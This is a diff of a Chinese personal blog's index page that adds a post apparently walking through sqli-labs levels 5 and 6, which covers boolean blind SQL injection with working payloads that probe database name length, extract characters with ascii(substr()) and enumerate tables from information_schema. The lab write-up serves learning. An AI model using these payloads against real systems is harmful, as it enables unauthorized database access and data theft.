@@ -145,6 +145,84 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/12/article-title-4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yanghaoxuan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yanghaoxuan'sBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/12/article-title-4/" class="post-title-link" itemprop="url">第五、六关：bool盲注</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-12 14:48:36 / 修改时间：15:05:50" itemprop="dateCreated datePublished" datetime="2020-12-12T14:48:36+08:00">2020-12-12</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><p>输入?=1正确，就输出you are in……；如果输入?=-1不正确，就不输出。<br>因此可以根据这个现象来推测,这是一个经典的bool盲注。</p>
+<p>先做一些sql语句的复习：</p>
+<p><code>1、length(database())</code> 是得到数据库的字符串长度。</p>
+<p><code>2、substr(var1, var2, var3)</code>  从字符串里截取其中一段字符（串）   - var1：被截取的字符串   - var2：从哪一位开始截取   - var3：截取长度 。</p>
+<p><code>3、ascii(var)</code> 取var字符的ascii码（十进制）。</p>
+<h2 id="1、数据库长度"><a href="#1、数据库长度" class="headerlink" title="1、数据库长度"></a>1、数据库长度</h2><p><code>?id=3&#39; and length(database())&gt;7--+</code></p>
+<p><code>&#39;</code> 的作用，是闭合。字符串长度大于7，没报错。</p>
+<p>再输入<code>?id=3&#39; and length(database())&gt;8--+</code></p>
+<p>报错，说明数据库长度不大于8，即数据库的名字有8个字符。</p>
+<h2 id="2、获得数据库名"><a href="#2、获得数据库名" class="headerlink" title="2、获得数据库名"></a>2、获得数据库名</h2><p><code>?id=3&#39; and ascii(substr(database(),1,1))&gt;114--+</code>不报错</p>
+<p><code>?id=3&#39; and ascii(substr(database(),1,1))&gt;115--+</code>报错</p>
+<p>数据库的第一位字符的ASCII码值大于114，不大于115，所以是115，所以数据库的第一个字符是s。</p>
+<p>接下来挨个尝试，最终得出数据库名为security。</p>
+<h2 id="3、获取表名"><a href="#3、获取表名" class="headerlink" title="3、获取表名"></a>3、获取表名</h2><p><code>*?id=3&#39;  and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1,1))&gt;100--+*</code>正常</p>
+<p><code>*?id=3&#39;  and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1,1))&gt;101--+*</code>报错</p>
+<p>说明表名的第一个字符是e,接下来可以得出第一个表名为emails</p>
+<p>接下来用limit输出其他表名</p>
+<p>….</p>
+<p>再得出列名、字段。</p>
+<h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><p>与第五关同样操作，不过单引号换成了双引号 </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/12/article-title-3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -558,7 +636,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
